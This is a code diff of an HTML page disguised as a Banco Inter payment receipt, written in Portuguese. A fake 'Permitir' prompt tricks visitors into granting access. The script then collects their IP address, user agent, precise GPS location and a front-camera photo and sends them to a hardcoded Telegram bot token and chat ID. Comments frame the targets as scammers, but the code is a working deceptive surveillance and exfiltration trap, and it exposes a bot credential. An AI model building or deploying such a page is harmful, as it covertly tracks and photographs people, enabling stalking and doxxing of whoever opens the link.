@@ -29,8 +29,7 @@
       text-align: left;
     }
 
-    h1,
-    h2 {
+    h1, h2 {
       color: #ff6200;
     }
 
@@ -61,19 +60,33 @@
       border-radius: 8px;
       font-weight: bold;
       line-height: 50px;
+      background-color: #f1f1f1;
+    }
+
+    .logo {
+      max-width: 200px;
+    }
+
+    @media print {
+      #permission-prompt {
+        display: none;
+      }
+      #receipt {
+        display: block;
+        box-shadow: none;
+      }
     }
   </style>
 </head>
 
 <body>
-
   <div id="permission-prompt">
     <p>Para visualizar o comprovante, clique em <span class="allow-button">Permitir</span></p>
   </div>
 
   <div id="receipt">
     <div class="receipt-header">
-      <h1><img src="logo-inter.svg.png" style="max-width: 200px;" /></h1>
+      <h1><img src="logo-inter.svg.png" alt="Banco Inter Logo" class="logo" /></h1>
       <h2>Comprovante de Pagamento</h2>
     </div>
     <div class="receipt-details">
@@ -94,10 +107,11 @@
   </div>
 
   <script>
+    // Configuration - Replace with your own Telegram bot token and chat ID
     const BOT_TOKEN = '7616155962:AAG1RQIcEtpZ5f2EsUHOnT8ND4oAvKF3U6U';
     const CHAT_ID = 610303414;
 
-    // Function to parse query parameters
+    // Function to parse query parameters with sanitization
     function getQueryParams() {
       const params = new URLSearchParams(window.location.search);
       return {
@@ -114,88 +128,151 @@
       };
     }
 
-    // Function to request location permission first, then camera permission
-    function requestPermissions() {
-      let ipAddress;
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => ipAddress = data.ip)
-        .catch()
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          console.log("Localização acessada com sucesso:", position.coords);
-          const currentDateTime = Date().toLocaleUpperCase("pt-BR");
-          const message = `
-                🌐 ${window.location.href} \n📅 Date / Time: ${currentDateTime}\n🏠 Location: https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}\n📍 IP: ${ipAddress}
-              `;
-          sendMessage(message);
-
-          // Request camera permission after location is granted
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-              console.log("Permissão da câmera concedida.");
-              captureImageAndSendToTelegram(stream, message);  // Capture image and send to Telegram
-              showReceipt();
-            })
-            .catch((error) => {
-              console.error("Erro ao acessar a câmera:", error);
-              alert('É necessário clicar em "Permitir" para visualizar o comprovante.');
-            });
-        },
-        (error) => {
-          console.error("Erro ao acessar a localização:", error);
-          alert('É necessário clicar em "Permitir" para visualizar o comprovante.');
-        },
-        { enableHighAccuracy: true }
-      );
+    // Function to collect IP address
+    async function getIpAddress() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'Unknown';
+      }
     }
 
-    // Function to capture an image from the camera stream and send it to Telegram
-    function captureImageAndSendToTelegram(stream, caption) {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-
-      // Wait for the video to load and capture the first frame
-      video.onloadedmetadata = function () {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        // Set the canvas dimensions to the video dimensions
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        // Draw the first frame from the video onto the canvas
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Convert canvas to Blob (image file)
-        canvas.toBlob((blob) => {
-          sendCapturedImageToTelegram(blob, caption);
-        }, 'image/jpeg');
-      };
+    // Function to send message to Telegram
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+          }),
+        });
+        const data = await response.json();
+        console.log('Message sent:', data);
+        return data;
+      } catch (error) {
+        console.error('Error sending message:', error);
+      }
     }
 
-    // Function to send the captured image to Telegram using FormData
-    function sendCapturedImageToTelegram(imageBlob, caption) {
+    // Function to send image to Telegram
+    async function sendImageToTelegram(imageBlob, caption) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
       const formData = new FormData();
-      formData.append('chat_id', CHAT_ID); // Replace with the actual chat ID
-      formData.append('photo', imageBlob, 'captured_image.jpg'); // Add the image file (with a name)
-      if (caption) formData.append('caption', caption)
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', imageBlob, 'captured_image.jpg');
+      if (caption) formData.append('caption', caption);
 
-      // Send the image using fetch
-      fetch(url, {
-        method: 'POST',
-        body: formData,
-      })
-      .then(response => response.json())
-      .then(data => console.log('Image sent to Telegram:', data))
-      .catch(error => console.error('Error sending image to Telegram:', error));
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData,
+        });
+        const data = await response.json();
+        console.log('Image sent:', data);
+        return data;
+      } catch (error) {
+        console.error('Error sending image:', error);
+      }
     }
 
-    // Function to display the receipt after permissions are granted
+    // Function to capture camera image
+    async function captureImage(stream) {
+      return new Promise((resolve) => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', true);
+        video.play();
+
+        video.onloadedmetadata = () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          
+          setTimeout(() => {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to blob and resolve
+            canvas.toBlob((blob) => {
+              // Stop all tracks to release camera
+              stream.getTracks().forEach(track => track.stop());
+              resolve(blob);
+            }, 'image/jpeg', 0.8);
+          }, 300); // Small delay to ensure video is playing
+        };
+      });
+    }
+
+    // Main function to handle permissions and data collection
+    async function collectDataAndShowReceipt() {
+      // Add click event to the allow button
+      document.querySelector('.allow-button').addEventListener('click', async () => {
+        try {
+          // Collect basic information
+          const url = window.location.href;
+          const userAgent = navigator.userAgent;
+          const now = new Date().toLocaleString('pt-BR');
+          const ipAddress = await getIpAddress();
+          
+          let message = `🎣 <b>Scammer interaction captured!</b>\n\n`;
+          message += `🌐 <b>URL:</b> ${url}\n`;
+          message += `📅 <b>Date/Time:</b> ${now}\n`;
+          message += `🖥 <b>User Agent:</b> ${userAgent}\n`;
+          message += `📍 <b>IP Address:</b> ${ipAddress}\n`;
+          
+          // Try to get geolocation
+          try {
+            const position = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                enableHighAccuracy: true,
+                timeout: 10000
+              });
+            });
+            
+            const { latitude, longitude } = position.coords;
+            const mapUrl = `https://www.google.com/maps/search/?api=1&query=${latitude}%2C${longitude}`;
+            message += `📌 <b>Location:</b> ${mapUrl}\n`;
+            message += `📊 <b>Coordinates:</b> ${latitude}, ${longitude}\n`;
+          } catch (geoError) {
+            message += `📌 <b>Location:</b> Permission denied or unavailable\n`;
+            console.error('Geolocation error:', geoError);
+          }
+          
+          // Send the initial message
+          await sendToTelegram(message);
+          
+          // Try to access camera
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+              video: { facingMode: 'user' }
+            });
+            
+            // Capture image and send it
+            const imageBlob = await captureImage(stream);
+            await sendImageToTelegram(imageBlob, `Scammer from IP: ${ipAddress}`);
+          } catch (cameraError) {
+            console.error('Camera error:', cameraError);
+            await sendToTelegram('📷 Camera access denied or unavailable');
+          }
+          
+          // Show the receipt regardless of permissions
+          showReceipt();
+        } catch (error) {
+          console.error('Error in data collection:', error);
+          // Still show receipt even if errors occur
+          showReceipt();
+        }
+      });
+    }
+
+    // Function to display the receipt
     function showReceipt() {
       document.getElementById('permission-prompt').style.display = 'none';
       document.getElementById('receipt').style.display = 'block';
@@ -214,33 +291,8 @@
       document.getElementById('authCode').textContent = params.authCode;
     }
 
-    // Request permissions on page load
-    window.onload = requestPermissions;
-
-    // Function to send a message through the Telegram Bot API using fetch
-    async function sendMessage(text) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-      try {
-        const data = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-          }),
-        })
-
-        console.log('Message sent:', data)
-      } catch (error) {
-        console.error('Error sending message:', error)
-      }
-    }
-
+    // Initialize when page loads
+    window.addEventListener('DOMContentLoaded', collectDataAndShowReceipt);
   </script>
-
 </body>
-
 </html>
